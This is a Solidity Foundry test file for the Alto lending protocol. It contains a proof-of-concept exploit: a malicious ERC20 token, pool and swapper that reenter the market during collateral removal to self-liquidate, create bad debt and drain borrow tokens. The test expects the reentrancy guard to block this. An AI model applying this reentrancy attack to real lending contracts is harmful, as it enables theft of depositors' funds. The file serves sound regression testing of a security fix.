// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {
    LiquidationConfiguration,
    BaseMarketInitParams,
    BorrowMarketInitParams
} from "@alto/lending/interfaces/IMarket.sol";
import {FixedRateIrm} from "@alto/lending/irm/FixedRateIrm.sol";
import {OracleMock} from "@alto/oracles/mocks/OracleMock.sol";
import {LENDING_ORACLE_PRICE_PRECISION} from "@alto/oracles/interfaces/IOracle.sol";
import {AltoLeverage} from "@alto/lending/leverage/AltoLeverage.sol";
import {IMarket, Position, IMarketErrors, IMarketEvents} from "@alto/lending/interfaces/IMarket.sol";
import {IAltoLeverageSwapper, SwapParams} from "@alto/lending/leverage/interfaces/IAltoLeverageSwapper.sol";
import {console} from "forge-std/console.sol";
import {ERC20Mock} from "@alto-test/helpers/ERC20Mock.sol";
import {FixedPointMath} from "@alto/utils/FixedPointMath.sol";
import {AssetShareConversionMath} from "@alto/lending/libraries/AssetShareConversionMath.sol";
import {MarketDeployer} from "@alto/utils/MarketDeployer.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ReentrancyGuardUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";
import {IUniswapV3PoolActions} from "@uniswap/v3-core/contracts/interfaces/pool/IUniswapV3PoolActions.sol";

bool constant TESTING_VULNERABLE_CONTRACT = false;
uint256 constant SUPPLIED_COLLATERAL_AMOUNT = 1000 ether;
uint256 constant COLLATERAL_AMOUNT_TO_WITHDRAW = SUPPLIED_COLLATERAL_AMOUNT - 1;
uint256 constant COLLATERAL_AMOUNT_AFTER_WITHDRAW = SUPPLIED_COLLATERAL_AMOUNT - COLLATERAL_AMOUNT_TO_WITHDRAW;
uint256 constant BORROWED_AMOUNT = 600 ether;
uint256 constant NEW_POSITION_COLLATERAL_AMOUNT = 2 wei;
uint256 constant MIN_AMOUNT_OUT = 1 wei;
uint256 constant NEW_POSITION_BORROW_AMOUNT = MIN_AMOUNT_OUT;

contract MaliciousERC20 is ERC20 {
    address public attacker;
    address public market;

    constructor(address _attacker, address _market) ERC20("Malicious ERC20", "MAL") {
        _mint(msg.sender, type(uint256).max);
        attacker = _attacker;
        market = _market;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        IERC20(IMarket(market).borrowToken()).approve(address(market), type(uint256).max);
        // Because we reentered the market contract AFTER the removeCollateral changed the state of the market
        // where most of the attacker's collateral is now removed, attacker's position can now be liquidated
        // This liquidation will create bad debt as attacker's collateral is much lower than the debt
        // as market is currently in state where attacker's collateral is now COLLATERAL_AMOUNT_AFTER_WITHDRAW and attacker has borrowed BORROWED_AMOUNT
        IMarket(market).liquidate(attacker, hex"");

        IERC20(IMarket(market).collateralToken()).approve(address(market), type(uint256).max);

        if (
            IMarket(market).position(attacker).collateralAssets != 0
                || IMarket(market).position(attacker).borrowShares != 0
        ) {
            revert("Attacker's collateral should be 0");
        }

        // Now, attacker's position was repaid and has nothing left so attacker has to become solvent again
        // by adding some collateral
        IMarket(market).addCollateral(NEW_POSITION_COLLATERAL_AMOUNT, attacker);
        // Attacker has to borrow something otherwise _repay would revert if we tried to repay 0
        IMarket(market).borrow(NEW_POSITION_BORROW_AMOUNT, 0, attacker, attacker, hex"");

        // This will also send the required amount of borrow token to the attacker to complete the swap
        // This could also be tied to another maliciousToken/borrowToken pool swap instead
        IERC20(IMarket(market).borrowToken()).transfer(to, MIN_AMOUNT_OUT);

        return true; // super.transfer(to, amount);
    }
}

contract MaliciousPool {
    using SafeERC20 for IERC20;

    address public maliciousERC20;
    address public collateralToken;

    constructor(address _maliciousErc20, address _collateralToken) {
        maliciousERC20 = _maliciousErc20;
        collateralToken = _collateralToken;
    }

    /// @dev mock of IUniswapV3Pool swap collateralToken/maliciousERC20
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        // Here we mock calling the malicious token contract that exploits the market
        // This could be called without mockup as transfer is usually called during swaps
        IERC20(maliciousERC20).safeTransfer(recipient, 1);
        return (0, 0);
    }
}

struct MockSwapperData {
    address maliciousPool;
    uint256 minAmountOut;
}

/// @dev This contract is used to test the AltoLeverageSwapper contract with malicious ERC20 tokens
/// and to implement PoC for the exploit
contract SwapperWithMaliciousERC20 is IAltoLeverageSwapper, Ownable {
    using SafeERC20 for IERC20;

    mapping(address => bool) public isWhitelisted;

    constructor(address _owner) Ownable(_owner) {}

    function setWhitelisted(address _address, bool _isWhitelisted) external onlyOwner {
        isWhitelisted[_address] = _isWhitelisted;
    }

    function swap(address sellToken, address buyToken, uint256 amountIn, bytes calldata swapParams)
        public
        payable
        returns (uint256)
    {
        IERC20(sellToken).safeTransferFrom(msg.sender, address(this), amountIn);

        MockSwapperData memory data = abi.decode(swapParams, (MockSwapperData));

        // FOLLOWING WOULD HAPPEN ON ATTACKER'S PREMISES
        // 1. Attacker set up malicious pool sellToken/maliciousToken and included a swap within that pool in the swapper data.
        // This way attacker stole all of the sellToken during the swap.
        IERC20(sellToken).safeTransfer(data.maliciousPool, uint256(amountIn));
        MaliciousPool(data.maliciousPool).swap(address(this), false, int256(amountIn), 0, hex"");

        IERC20(buyToken).safeTransfer(msg.sender, data.minAmountOut);

        // User's position will now be repaid as NEW_POSITION_BORROW_AMOUNT == data.minAmountOut
        return data.minAmountOut;
    }
}

contract AltoLeverageReentrancySwapperTest is Test {
    using FixedPointMath for uint256;
    using AssetShareConversionMath for uint256;

    IMarket market;
    ERC20Mock borrowToken;
    ERC20Mock collateralToken;
    AltoLeverage leverage;
    SwapperWithMaliciousERC20 swapper;
    address internal ATTACKER = makeAddr("ATTACKER");

    uint256 constant INITIAL_AMOUNT = 100000000000 ether;

    address oracle;

    function setUp() public {
        borrowToken = new ERC20Mock("Borrow Token", "BTKN");
        collateralToken = new ERC20Mock("Collateral Token", "CTKN");
        swapper = new SwapperWithMaliciousERC20(address(this));
        leverage = new AltoLeverage(address(swapper), address(this));

        address irm = address(new FixedRateIrm(0.04 ether / uint256(365 days), address(this)));
        oracle = address(new OracleMock());
        OracleMock(oracle).setPrice(1 * LENDING_ORACLE_PRICE_PRECISION);

        market = IMarket(
            MarketDeployer.deployBorrowMarket(
                BorrowMarketInitParams({
                    baseMarketInitParams: BaseMarketInitParams({
                        borrowToken: address(borrowToken),
                        collateralToken: address(collateralToken),
                        irm: address(irm),
                        owner: address(this),
                        oracle: address(oracle),
                        maxLtv: 0.8 ether,
                        feeRecipient: address(this),
                        liquidationConfiguration: LiquidationConfiguration({
                            maxLiquidationLtv: 0.85 ether,
                            dynamicBonusFeeStart: 0.03 ether,
                            ltvForCompleteLiquidation: 0.9 ether,
                            dynamicBonusFeeDecaySteepness: 5 ether,
                            liquidationBaseFee: 0.05 ether,
                            minPenaltyPercentage: 0.01 ether,
                            protocolFeePercentage: 0.075 ether,
                            isEnabledPriorityLiquidation: false,
                            disablePriorityLiquidationAbovePositionLtv: 0.95 ether,
                            priorityLiquidationGracePeriod: 5 minutes,
                            taggerLiquidationGracePeriod: 2 minutes,
                            liquidationWindowTag: 3 days
                        })
                    }),
                    initialBorrowOpeningFee: 0,
                    supplyCapAssets: 0
                })
            )
        );

        swapper.setWhitelisted(address(leverage), true);
        leverage.setMarket(address(market), true);
        market.setAuthorizedCallback(address(leverage), true);

        // Setup initial balances for basic setup
        deal(address(borrowToken), address(swapper), type(uint128).max);
        deal(address(collateralToken), address(swapper), type(uint128).max);

        // Supply tokens to the protocol
        deal(address(borrowToken), address(this), INITIAL_AMOUNT);
        borrowToken.approve(address(market), INITIAL_AMOUNT);
        market.addSupply(INITIAL_AMOUNT, 0, address(this));
        deal(address(collateralToken), address(this), INITIAL_AMOUNT);
        collateralToken.approve(address(market), INITIAL_AMOUNT);
        market.addCollateral(INITIAL_AMOUNT, address(this));
    }

    // test after fixing reentrancy vulnerability
    function testLiquidateDuringDevelerage() public {
        uint256 marketBalanceBefore = borrowToken.balanceOf(address(market));
        console.log("Initial market borrow balance", marketBalanceBefore);
        // Attacker creates position - ATTACKER's account only needs collateral to initialize the position
        vm.startPrank(address(ATTACKER));
        collateralToken.approve(address(market), SUPPLIED_COLLATERAL_AMOUNT);
        borrowToken.approve(address(market), BORROWED_AMOUNT);
        deal(address(collateralToken), ATTACKER, SUPPLIED_COLLATERAL_AMOUNT);
        market.addCollateral(SUPPLIED_COLLATERAL_AMOUNT, ATTACKER);
        market.borrow(BORROWED_AMOUNT, 0, ATTACKER, ATTACKER, hex"");
        vm.stopPrank();

        // Initialize malicious UniswapV3 pool and ERC20 token on attacker's behalf
        MaliciousERC20 maliciousERC20 = new MaliciousERC20(ATTACKER, address(market));
        MaliciousPool maliciousPool = new MaliciousPool(address(maliciousERC20), address(collateralToken));
        vm.prank(ATTACKER);
        // Authorize malicious ERC20 token to act on behalf of attacker
        market.setAuthorization(address(maliciousERC20), true);

        // Malicious ERC20 token needs to have enough balance to repay which is equal to
        // COLLATERAL_AMOUNT_AFTER_WITHDRAW - liquidationBaseFee because borrow token value is equal
        // to collateral token value at 1:1 ratio.
        // Also, attacker needs to have enough balance to setup new position with NEW_POSITION_COLLATERAL_AMOUNT and NEW_POSITION_BORROW_AMOUNT
        uint256 borrowAmountNeededToRepay = COLLATERAL_AMOUNT_AFTER_WITHDRAW
            * (1 ether - market.liquidationConfiguration().liquidationBaseFee) / 1 ether;
        deal(
            address(borrowToken),
            address(maliciousERC20),
            borrowAmountNeededToRepay + NEW_POSITION_BORROW_AMOUNT + MIN_AMOUNT_OUT
        );
        deal(address(collateralToken), address(maliciousERC20), NEW_POSITION_COLLATERAL_AMOUNT);

        bytes memory swapParams =
            abi.encode(MockSwapperData({maliciousPool: address(maliciousPool), minAmountOut: MIN_AMOUNT_OUT}));

        vm.prank(ATTACKER);
        // Following Reentrancy revert has to be triggered otherwise removeCollateral call would complete successfully
        // REMOVE THIS IF TESTING FOR REENTRANCY VULNERABILITY
        if (!TESTING_VULNERABLE_CONTRACT) {
            vm.expectRevert(ReentrancyGuardUpgradeable.ReentrancyGuardReentrantCall.selector);
        }

        market.removeCollateral(COLLATERAL_AMOUNT_TO_WITHDRAW, ATTACKER, address(leverage), swapParams);

        if (!TESTING_VULNERABLE_CONTRACT) {
            console.log("Function reverted - attack averted");
        } else {
            console.log(
                "Total collateral amount that attacker needed",
                borrowAmountNeededToRepay + NEW_POSITION_BORROW_AMOUNT + SUPPLIED_COLLATERAL_AMOUNT
            );
            console.log(
                "Attacker's collateral amount after the attack",
                collateralToken.balanceOf(address(maliciousERC20)) + market.position(ATTACKER).collateralAssets
                    + collateralToken.balanceOf(ATTACKER) + collateralToken.balanceOf(address(maliciousPool))
            );

            console.log("Total borrow amount that attacker needed", NEW_POSITION_BORROW_AMOUNT + MIN_AMOUNT_OUT);

            uint256 attackerPositionBorrowedAfter = uint256(market.position(ATTACKER).borrowShares)
                .convertToAssetsUp(market.totalBorrowed().assets, market.totalBorrowed().shares);
            console.log(
                "Attacker's borrow amount after the attack",
                borrowToken.balanceOf(address(maliciousERC20)) - attackerPositionBorrowedAfter
                    + borrowToken.balanceOf(ATTACKER) + borrowToken.balanceOf(address(maliciousPool))
            );

            uint256 marketBalanceAfter = borrowToken.balanceOf(address(market));
            console.log("Market borrow balance after the attack", marketBalanceAfter);
            console.log("Attacker's stolen borrow token", marketBalanceBefore - marketBalanceAfter);
        }
    }

    function isSolvent(address user, address _market) internal view returns (bool, uint256 max, uint256 current) {
        uint256 collateralPrice = OracleMock(oracle).getPrice();
        uint256 collateralValue = uint256(IMarket(_market).position(user).collateralAssets)
            .divideWithRounding(collateralPrice, LENDING_ORACLE_PRICE_PRECISION, false);
        uint256 maxBorrowValue = collateralValue.multiplyWithPrecision(IMarket(_market).maxLtv());
        uint256 borrowValue = uint256(IMarket(_market).position(user).borrowShares)
            .convertToAssetsUp(IMarket(_market).totalBorrowed().assets, IMarket(_market).totalBorrowed().shares);

        return (maxBorrowValue >= borrowValue, maxBorrowValue, borrowValue);
    }
}
